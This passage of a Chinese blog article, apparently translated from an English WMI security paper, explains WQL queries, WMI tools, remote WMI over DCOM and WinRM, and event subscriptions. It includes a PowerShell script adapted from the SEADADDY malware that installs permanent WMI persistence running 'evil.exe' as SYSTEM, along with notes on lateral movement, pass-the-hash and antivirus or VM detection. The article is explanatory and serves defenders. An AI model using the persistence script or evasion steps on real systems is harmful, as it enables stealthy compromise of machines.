class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__Event</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventConsumer</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventConsumerProviderRegistration</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventDroppedEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventFilter</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventGenerator</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventProviderRegistration</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__EventQueueOverflowEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ExtendedStatus</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__ExtrinsicEvent</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__FilterToConsumerBinding</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__IndicationRelated</span><br><span class="line">\\WIN-Q4UUJ0BPKL9\ROOT\CIMV2:__InstanceCreationEvent</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="查询WMI"><a href="#查询WMI" class="headerlink" title="查询WMI"></a>查询WMI</h2><p>WMI提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即<code>WQL</code>。WQL查询通常可以分为以下几类：</p>
<ol>
<li>Instance Queries（实例查询）：查询WMI对象实例。</li>
<li>Event Queries（事件查询）：等同于在WMI对象创建&#x2F;修改&#x2F;删除的时候注册一个消息。</li>
<li>Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。</li>
</ol>
<h3 id="Instance-Queries"><a href="#Instance-Queries" class="headerlink" title="Instance Queries"></a>Instance Queries</h3><p>这是最常用的WQL查询。基本的格式如下：</p>
<p><code>SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p>例如，下面的查询语句将返回所有可执行文件名中带有<code>chrome</code>的正在运行的进程：</p>
<p><code>SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot;</code></p>
<h3 id="Event-Queries"><a href="#Event-Queries" class="headerlink" title="Event Queries"></a>Event Queries</h3><p>事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建&#x2F;修改&#x2F;删除的时候给用户发送一个消息。根据消息类型是<code>intrinsic</code>（系统自带的）还是<code>extrinsic</code>（第三方的），查询语句格式不同：</p>
<p><code> SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p><code> SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME]  &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p>下面的查询将在用户登录的时候被执行：<br><code>SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA &#39;Win32_LogonSession&#39; AND TargetInstance.LogonType=2</code></p>
<p>下面的查询将在用户插入可移除设备时被执行：<br><code>SELECT * FROM Win32_VolumeChangeEvent Where EventType=2</code></p>
<h3 id="Meta-Queries"><a href="#Meta-Queries" class="headerlink" title="Meta Queries"></a>Meta Queries</h3><p>元查询用来查询WMI命名空间和类结构的信息。最常见的用法是用来列举WMI命名空间的类结构。元查询是实例查询的一个子集，但是与对象查询不同的是，我们查询的是类的实例的定义。格式如下：</p>
<p><code>SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p>
<p>下面这个语句会查询所有以<code>WIN32</code>开头的WMI的类：</p>
<p><code>SELECT * FROM Meta_Class WHERE __CLASS LIKE &quot;Win32%&quot;</code></p>
<p>下面这个语句会查询某个命名空间下的所有命名空间：</p>
<p><code>SELECT Name FROM __NAMESPACE</code></p>
<p>注意，当不显示的指定命名空间时，默认的命名空间为<code>ROOT\CIMV2</code>。</p>
<h2 id="与WMI交互"><a href="#与WMI交互" class="headerlink" title="与WMI交互"></a>与WMI交互</h2><p>Microsoft和一些第三方软件开发者为我们提供了许多能够与WMI交互的工具。下面是部分工具的一个不完全的列表：</p>
<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerShell是一个非常强大的脚本语言，其中包含很多能够与WMI进行交互的功能。对于<code>PowerShell v3</code>版本来说，有如下：</p>
<ul>
<li>Get-WmiObject</li>
<li>Get-CimAssociatedInstance</li>
<li>Get-CimClass</li>
<li>Get-CimInstance</li>
<li>Get-CimSession</li>
<li>Set-WmiInstance</li>
<li>Set-CimInstance</li>
<li>Invoke-WmiMethod</li>
<li>Invoke-CimMethod</li>
<li>New-CimInstance</li>
<li>New-CimSession</li>
<li>New-CimSessionOption</li>
<li>Register-CimIndicationEvent</li>
<li>Register-WmiEvent</li>
<li>Remove-CimInstance</li>
<li>Remove-WmiObject</li>
<li>Remove-CimSession</li>
</ul>
<p>WMI命令和CIM命令的功能相似，但是在<code>v3</code>版本的PowerShell中，CIM更加的灵活。使用CIM命令最大的好处就是它们可以在<code>WinRM</code>和<code>DCOM</code>协议下工作，而WMI命令只支持<code>DCOM</code>协议。</p>
<p>从攻击者的角度看，专门用来创建&#x2F;修改&#x2F;删除WMI&#x2F;CIM类的命令是不存在的。但是，使用WMI可以很容易的创建WMI类。<br>这篇文章的例子中将主要使用PowerShell，因为它的灵活性，并且攻击者越来越多的使用它。</p>
<h3 id="wmic-exe"><a href="#wmic-exe" class="headerlink" title="wmic.exe"></a>wmic.exe</h3><p><code>wmic.exe</code>是一款非常强大的用来与WMI交互的命令行工具。它有非常多而且方便的WMI对象的别名可使用，可以用来进行更加复杂的查询。<br><code>wmic.exe</code>还能够执行WMI方法，攻击者在做内网横向移动时，用的就是Win32_Process的Create方法。但是有一个限制就是，我们不能执行一个接受内置WMI对象的方法。如果PowerShell不可用，用wmic.exe来做系统信息收集和执行一些基本操作还是可以的，它也是常常被渗透测试员和攻击者使用。</p>
<h3 id="wbemtest-exe"><a href="#wbemtest-exe" class="headerlink" title="wbemtest.exe"></a>wbemtest.exe</h3><p><code>wbemtest.ext</code>是一款强大的图形化工具，是出于诊断工具来设计的。可以用来枚举对象实例，执行查询，注册事件，修改WMI对象和类，本地或远程执行。虽然界面不是非常友好，但是对攻击者来说，在其他工具无法使用时，这个工具还是不错的。<br><img src="/images/92c89cf85b3378be0490310e65809a46f9df895f.png" alt="wmi-2.png"></p>
<h3 id="WMI-Explorer"><a href="#WMI-Explorer" class="headerlink" title="WMI Explorer"></a>WMI Explorer</h3><p>WMI Explorer是Sapien公司开发的一款商业工具，用来查找WMI类。它拥有非常好的界面，并且可以分层浏览WMI库。它不可以连接远程WMI库并执行查询。<br><img src="/images/2fa637c32b47d32ea6504f5d554890aa6600c548.png" alt="wmi-3.png"></p>
<h3 id="CIM-Studio"><a href="#CIM-Studio" class="headerlink" title="CIM Studio"></a>CIM Studio</h3><p>CIM Studio是免费的，来自Microsoft，可以用它方便的浏览WMI库，用来查找WMI类也是不错的。<br><img src="/images/5f0b8d15296e088721e7142188eb46d15330144d.png" alt="wmi-4.png"></p>
<h3 id="Windows-Script-Host-WSH-languages"><a href="#Windows-Script-Host-WSH-languages" class="headerlink" title="Windows Script Host (WSH) languages"></a>Windows Script Host (WSH) languages</h3><p><code>VBScript</code>和<code>JScript</code>，虽然Microsoft提供的这两个脚本语言名声不太好，但是就与WMI交互功能来说，它们还是很强大的。事实上，有一个完整的后门程序就是使用这两种脚本语言开发的，其中使用WMI功能完成了基本的<code>C2 (Command and Control)</code>机制。<br>另外，稍后我们会详细介绍，<code>Event Consumer</code>（事件处理）接口<code>ActiveScriptEventConsumer</code>，只有这两种脚本语言，而这个接口对攻击者和防御者来说都很有价值。<br>不管怎样，在那些没有PowerShell环境的老系统中，VBScript和JScript还是霸主地位。</p>
<h3 id="C-x2F-C-via-IWbem-COM-API"><a href="#C-x2F-C-via-IWbem-COM-API" class="headerlink" title="C&#x2F;C++ via IWbem* COM API"></a>C&#x2F;C++ via IWbem* COM API</h3><p>请自行查看<code>COM API for WMI</code>。如果想详细分析包含WMI功能的恶意软件的话，这个接口对逆向工程师来说也很重要。</p>
<h3 id="NET-using-System-Management-classes"><a href="#NET-using-System-Management-classes" class="headerlink" title=".NET using System.Management classes"></a>.NET using System.Management classes</h3><p>.NET 类库在<code>System.Management</code>命名空间下提供了几个用于与WMI交互的类，使用C#等语言编写起来也很简单。在下面的例子中，这些类会在PowerShell代码中反复使用。</p>
<h3 id="winrm-exe"><a href="#winrm-exe" class="headerlink" title="winrm.exe"></a>winrm.exe</h3><p><code>winrm.exe</code>可以在本地或远程开启WinRM服务的机器上枚举WMI对象实例，调用方法，创建和删除对象实例。winrm.exe也可用来配置WinRM服务。与WMI交互的理想方法是使用CIM命令的PowerShell，但是这个可以作为替代方法。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Process @&#123;CommandLine=&quot;notepad.exe&quot;;CurrentDirectory=&quot;C:\&quot;&#125;</span><br><span class="line">winrm enumerate http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Process</span><br><span class="line">winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem</span><br></pre></td></tr></table></figure>

<h3 id="wmic-and-wmis-pth-for-Linux"><a href="#wmic-and-wmis-pth-for-Linux" class="headerlink" title="wmic and wmis-pth for Linux"></a>wmic and wmis-pth for Linux</h3><p><code>wmic</code>是一个用来执行WMI查询的简单的Linux命令行工具，可远程调用Win32_Process的Create方法。wmis还接收NTML哈希。</p>
<h2 id="远程WMI"><a href="#远程WMI" class="headerlink" title="远程WMI"></a>远程WMI</h2><p>WMI的强大体现在通过远程操作的时候。目前，WMI支持两种协议：<code>DCOM</code>和<code>WinRM</code>，使用这两种协议可以做任何事情，包括查询对象，注册事件和执行WMI类的方法，等等。</p>
<p>两种协议都对攻击者有利，因为防御者通常不会检查这两种协议的恶意流量。利用WMI所需的东西就是可用的有权限的用户凭证。在Linux平台上的<code>wmis-pth</code>工具中，只需要提供被攻击者的用户哈希即可。</p>
<h3 id="DCOM-Distributed-Component-Object-Model"><a href="#DCOM-Distributed-Component-Object-Model" class="headerlink" title="DCOM (Distributed Component Object Model)"></a>DCOM (Distributed Component Object Model)</h3><p>从WMI被引入的时候起，<code>DCOM</code>就被当作默认协议。DCOM通过135端口建立TCP连接，后续的数据交换则通过随机选择的TCP端口传输。这个端口可以通过<code>dcomcnfg.exe</code>进行配置和修改，其最终是改动如下注册表项：</p>
<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\Internet - Ports (REG_MULTI_SZ)</code></p>
<p>所有的PowerShell中内置的WMI命令都使用DCOM协议。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Michael\Desktop&gt; Get-WmiObject -Class Win32_Process -ComputerName WIN-Q4UUJ0BPKL9 -Credential &#x27;WIN-Q4UUJ0BPKL9\Administrator&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="WinRM-Windows-Remote-Management"><a href="#WinRM-Windows-Remote-Management" class="headerlink" title="WinRM (Windows Remote Management)"></a>WinRM (Windows Remote Management)</h3><p>近来，WinRM已经超过了DCOM，被Windows当作建议使用的协议。WinRM基于<code>Web Services-Management (WSMan)</code>规范，是一个<code>SOAP-based</code>设备管理协议。另外，<code>PowerShell Remoting</code>也是基于WinRM规范的，这使得我们能够通过PowerShell在大规模Windows企业环境中实现强大的远程管理功能。WinRM同样支持WMI，或者说CIM的网络操作。</p>
<p>默认情况下，WinRM服务开启并监听<code>5985/tcp</code>端口，而且默认是加密的。还可以通过配置证书的方式在<code>5986/tcp</code>端口实现<code>HTTPS</code>支持。</p>
<p>通过<code>GPO</code>，winrm.exe和PowerShell的<code>WSMan</code>虚拟盘符，我们可以很方便的配置WinRM。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Michael\Desktop&gt; ls WSMan:\localhost</span><br><span class="line"></span><br><span class="line">   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost</span><br><span class="line"></span><br><span class="line">Type            Name                           SourceOfValue   Value</span><br><span class="line">----            ----                           -------------   -----</span><br><span class="line">System.String   MaxEnvelopeSizekb                              500</span><br><span class="line">System.String   MaxTimeoutms                                   60000</span><br><span class="line">System.String   MaxBatchItems                                  32000</span><br><span class="line">System.String   MaxProviderRequests                            4294967295</span><br><span class="line">Container       Client</span><br><span class="line">Container       Service</span><br><span class="line">Container       Shell</span><br><span class="line">Container       Listener</span><br><span class="line">Container       Plugin</span><br><span class="line">Container       ClientCertificate</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>PowerShell提供了方便的命令去检测WinRM服务是否处于监听状态——<code>Test-WSMan</code>。<br>如果Test-WSMan有返回结果，则说明WinRM服务正常，而且这个命令不需要传入认证信息。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Michael&gt; Test-WSMan -ComputerName WIN-JF74R0AP7LN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd</span><br><span class="line">ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd</span><br><span class="line">ProductVendor   : Microsoft Corporation</span><br><span class="line">ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0</span><br></pre></td></tr></table></figure>

<p>如果要与运行着WinRM服务的系统的WMI进行远程交互，可用命令有两个：<code>winrm.exe</code>和PowerShell的<code>CIM命令</code>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PS C:\Users\Michael&gt; $s = New-CimSession -ComputerName win -Credential &#x27;win\Michael&#x27; -Authentication Negotiate</span><br><span class="line">PS C:\Users\Michael&gt; Get-CimInstance -CimSession $s -ClassName Win32_Process</span><br><span class="line"></span><br><span class="line">ProcessId            Name             HandleCount          WorkingSetSize       VirtualSize         PSComputerName</span><br><span class="line">---------            ----             -----------          --------------       -----------         --------------</span><br><span class="line">0                    System Idle P... 0                    24576                0                   win</span><br><span class="line">4                    System           545                  839680               4771840             win</span><br><span class="line">244                  smss.exe         29                   1056768              5234688             win</span><br><span class="line">332                  csrss.exe        664                  4886528              97574912            win</span><br><span class="line">372                  wininit.exe      76                   4255744              45420544            win</span><br><span class="line">380                  csrss.exe        290                  15814656             168321024           win</span><br><span class="line">...</span><br><span class="line">3528                 SGTool.exe       323                  21172224             180084736           win</span><br><span class="line">2808                 WmiApSrv.exe     121                  6074368              32092160            win</span><br></pre></td></tr></table></figure>

<h2 id="WMI-Eventing（WMI事件）"><a href="#WMI-Eventing（WMI事件）" class="headerlink" title="WMI Eventing（WMI事件）"></a>WMI Eventing（WMI事件）</h2><p>对攻击者和防御者都非常强大的一个功能是，WMI拥有异步响应WMI事件的能力。加上适当的异常处理，WMI事件基本可以用来响应所有的操作系统事件。</p>
<p>WMI事件分两类，包括运行在本地上下文环境当中的单个进程的事件和永久性WMI事件订阅。（There are two classes of WMI events – those that run locally in the context of a single process and permanent WMI event subscriptions.）<br>本地事件有生命周期为进程宿主的周期，而永久性WMI事件是存储在WMI库中，以SYSTEM权限运行，并且重启后依然存在。</p>
<h3 id="Eventing-Requirements（事件要求）"><a href="#Eventing-Requirements（事件要求）" class="headerlink" title="Eventing Requirements（事件要求）"></a>Eventing Requirements（事件要求）</h3><p>为了能够安装一个永久性的WMI事件订阅，必须满足三个条件：</p>
<ol>
<li>一个事件过滤器</li>
<li>一个事件处理：代表一个事件触发时启动的动作</li>
<li>一个处理绑定的过滤器：代表将一个过滤器绑定到一个事件处理的注册机制</li>
</ol>
<h3 id="Event-FIlters（事件过滤器）"><a href="#Event-FIlters（事件过滤器）" class="headerlink" title="Event FIlters（事件过滤器）"></a>Event FIlters（事件过滤器）</h3><p>一个事件过滤器接收一个WMI事件查询参数，并保存到<code>ROOT\subscription:__EventFilter</code>对象的一个实例中。<br>事件过滤器支持以下类型的查询：</p>
<h4 id="Intrinsic-Events"><a href="#Intrinsic-Events" class="headerlink" title="Intrinsic Events"></a>Intrinsic Events</h4><p><code>Intrinsic Events</code>在当一个WMI类或对象创建，修改，删除的时候被触发，用来传递信息给启动计时器或要执行的WMI方法，下面的这个Intrinsic Events在所有的WMI命名空间中都有，并以系统类的形式命名（以两个下划线开头）：</p>
<ul>
<li>__NamespaceOperationEvent</li>
<li>__NamespaceModificationEvent</li>
<li>__NamespaceDeletionEvent</li>
<li>__NamespaceCreationEvent</li>
<li>__ClassOperationEvent</li>
<li>__ClassDeletionEvent</li>
<li>__ClassModificationEvent</li>
<li>__ClassCreationEvent</li>
<li>__InstanceOperationEvent</li>
<li>__InstanceCreationEvent</li>
<li>__MethodIvocationEvent</li>
<li>__InstanceModificationEvent</li>
<li>__InstanceDeletionEvent</li>
<li>__TimerEvent</li>
</ul>
<p>这些事件都非常强大，因为它们可以用来触发你能想象到的任何的操作系统事件。例如，一个人可以通过下面的命令在用户登陆时触发一个事件：<br><code>SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA &#39;Win32_LogonSession&#39; AND TargetInstance.LogonType=2</code></p>
<p>上面的查询的意思是，在一个登陆类型为2（交互式登陆）的Win32_LogonSession类的实例创建时，触发一个事件。</p>
<p>由于特定Intrinsic Event的调用时间不同，我们必须在查询中指定一个Polling Interval（时间间隔），也就是说，偶尔我们会触发不了这样的事件。比如一个事件查询的目标是一个WMI类实例的创建，如果这个实例在我们指定的时间间隔内生成并销毁了，那么这个事件将不会被查询到。</p>
<h4 id="Extrinsic-Events"><a href="#Extrinsic-Events" class="headerlink" title="Extrinsic Events"></a>Extrinsic Events</h4><p>Extrinsic Events解决了Intrinsic Events的时间间隔的问题，因为当一个事件发生时，一个Extrinsic Event就立即被触发了，但劣势是当前的WMI中的Extrinsic Events并不多，不过现有有这些也很强大了：</p>
<ul>
<li>ROOT\CIMV2:Win32_ComputerShutdownEvent</li>
<li>ROOT\CIMV2:Win32_ProcessStartTrace</li>
<li>ROOT\CIMV2:Win32_ModuleLoadTrace</li>
<li>ROOT\CIMV2:Win32_ThreadStartTrace</li>
<li>ROOT\CIMV2:Win32_VolumnChangeEvent</li>
<li>ROOT\DEFAULT:Msft_WmiProvider*</li>
<li>ROOT\DEFAULT:RegistryKeyChangeEvent</li>
<li>ROOT\DEFAULT:RegistryValueChangeEvent</li>
</ul>
<p>下面的命令可以查询到用户态和内核态下每个进程的所有模块：<br><code>SELECT * FROM Win32_ModuleLoadTrace</code></p>
<h3 id="Event-Consumers（事件处理）"><a href="#Event-Consumers（事件处理）" class="headerlink" title="Event Consumers（事件处理）"></a>Event Consumers（事件处理）</h3><p>一个Event Consumer代表当一个事件触发时进行的操作。可用的标准事件处理类：</p>
<ul>
<li>LogFileEventConsumer： 将事件数据写入到指定的日志文件</li>
<li>ActiveScriptEventConsumer： 用来执行VBScript&#x2F;JScript程序</li>
<li>NTEventLogEventConsumer：创建一个包含事件数据的日志入口点</li>
<li>SMTPEventConsumer：将事件数据用邮件发送</li>
<li>CommandLineEventConsumer：执行一条命令</li>
</ul>
<p>可以想象到，ActiveScriptEventConsumer和CommandLineEventConsumer类应该是攻击者处理事件时使用最频繁的。这两个事件处理类给攻击都提供了一种无文件式的执行任意代码的灵活性。</p>
<p>所有的事件处理类都在从<code>__EventConsumer</code>类继承而来的。</p>
<h3 id="恶意WMI持久化实例"><a href="#恶意WMI持久化实例" class="headerlink" title="恶意WMI持久化实例"></a>恶意WMI持久化实例</h3><p>下面的PowerShell代码来自一个叫SEADADDY的恶意软件的修改版，用来通过WMI做持久化的。其中，事件过滤是从PowerSploit的持久化模块，用于在系统启动时触发，事件处理则以SYSTEM权限执行一个程序。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filterName = <span class="string">&#x27;BotFilter82&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">consumerName = <span class="string">&#x27;BotConsumer23&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">exePath = <span class="string">&#x27;C:\Windows\System32\evil.exe&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Query = <span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;=200  AND TargetInstance.SystemUpTime &lt; 320&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace <span class="string">&quot;root\subscription&quot;</span> -Arguments @&#123;Name=<span class="variable">$filterName</span>;EventNameSpace=<span class="string">&quot;root\cimv2&quot;</span>;QueryLanguage=<span class="string">&quot;WQL&quot;</span>;Query=<span class="variable">$Query</span>&#125; -ErrorAction Stop</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace <span class="string">&quot;root\subscription&quot;</span> -Arguments @&#123;Name=<span class="variable">$consumerName</span>;ExecutablePath=<span class="variable">$exePath</span>;CommandLineTemplate=<span class="variable">$exePath</span>&#125;</span></span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WMI-Attach（WMI攻击）"><a href="#WMI-Attach（WMI攻击）" class="headerlink" title="WMI Attach（WMI攻击）"></a>WMI Attach（WMI攻击）</h2><p>WMI的强大使得它成为攻击者在攻击过程中各个阶段都会使用的一个工具。众多的WMI对象&#x2F;方法&#x2F;事件使得它在进行信息收集，AV&#x2F;VM检测，代码执行，横向移动，信息隐藏存储和持久化中都非常有用。甚至，还可以构造出一个无需任何写文件到硬盘的WMI后门程序。</p>
<p>攻击都使用WMI有如下优势：</p>
<ul>
<li>在Windows 98以后的所有Windows操作系统中都是默认安装并运行的。</li>
<li>在做代码执行时，比<code>psexec</code>更隐蔽。</li>
<li>永久性WMI事件订阅是在SYSTEM权限下运行的。</li>
<li>防御者一般 都不将WMI视为一个可攻击的点。</li>
<li>几乎所有系统行为都可以触发一个WMI事件。</li>
<li>除了WMI库，恶意代码无需保存到硬盘文件（<code>无文件</code>）。</li>
</ul>
<p>下面列举一些攻击者使用WMI的方法，但这些方法只是其中的一小部分。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>恶意软件或渗透人员第一步，往往是信息收集。WMI提供了数量众多的类为攻击者使用，来对当前目标环境有一个了解。</p>
<p>如下是非常常用的信息收集行为以及对应的WMI对象：</p>
<ul>
<li>Host&#x2F;OS information: Win32_OperatingSystem, Win32_ComputerSystem</li>
<li>File&#x2F;directory listing: CIM_DataFile</li>
<li>Disk volume listing: Win32_Volumn</li>
<li>Registry operations: StdRegProv</li>
<li>Running processes: Win32_Process</li>
<li>Service listing: Win32_Service</li>
<li>Event log: Win32_LoggedOnUser</li>
<li>Mounted shares: Win32_Share</li>
<li>Installed patches: Win32_QuickFixEngineering</li>
</ul>
<h3 id="AV-x2F-VM-检测"><a href="#AV-x2F-VM-检测" class="headerlink" title="AV&#x2F;VM 检测"></a>AV&#x2F;VM 检测</h3><h4 id="反病毒软件检测"><a href="#反病毒软件检测" class="headerlink" title="反病毒软件检测"></a>反病毒软件检测</h4><p>根据系统的不同，反病毒软件通常会WMI中注册为<code>AntiVirusProduct</code>，保存在<code>root\SecurityCenter</code>或<code>root\SecurityCenter2</code>命名空间中。<br>WQL语句：<br><code>SELECT * FROM AntiVirusProduct</code></p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\qaz&gt; Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__GENUS                  : 2</span><br><span class="line">__CLASS                  : AntiVirusProduct</span><br><span class="line">__SUPERCLASS             :</span><br><span class="line">__DYNASTY                : AntiVirusProduct</span><br><span class="line">__RELPATH                : AntiVirusProduct.instanceGuid=&quot;&#123;8EA8924E-BC81-DC44-8BB0-8BAE75D86EBF&#125;&quot;</span><br><span class="line">__PROPERTY_COUNT         : 6</span><br><span class="line">__DERIVATION             : &#123;&#125;</span><br><span class="line">__SERVER                 : DESKTOP-E4EEK0L</span><br><span class="line">__NAMESPACE              : ROOT\SecurityCenter2</span><br><span class="line">__PATH                   : \\DESKTOP-E4EEK0L\ROOT\SecurityCenter2:AntiVirusProduct.instanceGuid=&quot;&#123;8EA8924E-BC81-DC44-8B</span><br><span class="line">                           B0-8BAE75D86EBF&#125;&quot;</span><br><span class="line">displayName              : Avast Antivirus</span><br><span class="line">instanceGuid             : &#123;8EA8924E-BC81-DC44-8BB0-8BAE75D86EBF&#125;</span><br><span class="line">pathToSignedProductExe   : C:\Program Files\AVAST Software\Avast\wsc_proxy.exe</span><br><span class="line">pathToSignedReportingExe : C:\Program Files\AVAST Software\Avast\wsc_proxy.exe</span><br><span class="line">productState             : 266240</span><br><span class="line">timestamp                : Mon, 05 Mar 2018 07:41:16 GMT</span><br><span class="line">PSComputerName           : DESKTOP-E4EEK0L</span><br><span class="line"></span><br><span class="line">__GENUS                  : 2</span><br><span class="line">__CLASS                  : AntiVirusProduct</span><br><span class="line">__SUPERCLASS             :</span><br><span class="line">__DYNASTY                : AntiVirusProduct</span><br><span class="line">__RELPATH                : AntiVirusProduct.instanceGuid=&quot;&#123;D68DDC3A-831F-4fae-9E44-DA132C1ACF46&#125;&quot;</span><br><span class="line">__PROPERTY_COUNT         : 6</span><br><span class="line">__DERIVATION             : &#123;&#125;</span><br><span class="line">__SERVER                 : DESKTOP-E4EEK0L</span><br><span class="line">__NAMESPACE              : ROOT\SecurityCenter2</span><br><span class="line">__PATH                   : \\DESKTOP-E4EEK0L\ROOT\SecurityCenter2:AntiVirusProduct.instanceGuid=&quot;&#123;D68DDC3A-831F-4fae-9E</span><br><span class="line">                           44-DA132C1ACF46&#125;&quot;</span><br><span class="line">displayName              : Windows Defender</span><br><span class="line">instanceGuid             : &#123;D68DDC3A-831F-4fae-9E44-DA132C1ACF46&#125;</span><br><span class="line">pathToSignedProductExe   : windowsdefender://</span><br><span class="line">pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe</span><br><span class="line">productState             : 393472</span><br><span class="line">timestamp                : Mon, 05 Mar 2018 07:41:36 GMT</span><br><span class="line">PSComputerName           : DESKTOP-E4EEK0L</span><br></pre></td></tr></table></figure>

<h4 id="VM-x2F-沙盒检测"><a href="#VM-x2F-沙盒检测" class="headerlink" title="VM&#x2F;沙盒检测"></a>VM&#x2F;沙盒检测</h4><p>比如一个物理内存只有2GB或者是一个单核的，就非常像是一个VM。</p>
<p>WQL查询例子：</p>
